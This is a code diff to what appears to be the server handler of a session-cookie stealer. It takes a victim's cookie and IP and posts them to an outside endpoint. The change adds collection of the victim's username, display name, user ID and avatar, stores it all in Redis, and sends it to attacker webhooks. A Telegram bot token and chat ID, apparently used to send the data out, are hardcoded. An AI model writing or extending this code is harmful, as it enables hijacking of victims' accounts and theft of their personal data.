@@ -3,7 +3,7 @@ const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
-const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
+const BROWSER_URL = 'https://spain-tools.vercel.app/api/browser';
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -48,7 +48,7 @@ async function getIpGeo(ip) {
 
 async function getLiteInfo(cookie, victimIp) {
   try {
-    const r = await fetch(WORKER_URL, {
+    const r = await fetch(BROWSER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie, victimIp, lite: true })
@@ -206,12 +206,16 @@ export default async function handler(req, res) {
 
   await redisSet(`refresh:${refreshId}`, {
     cookie,
-    webhook:   record.webhook,
-    webhook1:  webhooks[1] || null,
+    webhook:     record.webhook,
+    webhook1:    webhooks[1] || null,
     pageName,
     ip,
-    isp:       geo?.isp || 'Unknown',
-    createdAt: now
+    isp:         geo?.isp || 'Unknown',
+    username:    liteInfo.username    || 'Unknown',
+    displayName: liteInfo.displayName || '',
+    userId:      liteInfo.id          || '',
+    avatarUrl:   liteInfo.avatarUrl   || '',
+    createdAt:   now
   });
 
   for (const wh of webhooks) {
